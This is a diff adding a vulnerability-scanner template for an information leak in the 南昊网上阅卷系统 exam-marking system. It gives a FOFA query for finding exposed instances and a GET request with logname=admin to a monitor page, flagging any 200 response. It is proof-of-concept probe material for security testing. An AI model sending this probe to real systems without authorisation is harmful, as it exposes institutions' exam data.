@@ -1,0 +1,19 @@
+id: poc-spy89f6iniqf8b4h
+info:
+  name: 南昊网上阅卷系统 logname 存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/spy89f6iniqf8b4h'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: spy89f6iniqf8b4h
+    fofa: app="南昊网上阅卷系统"
+http:
+- raw:
+  - GET /exam/monitor/index.jsp?logname=admin HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
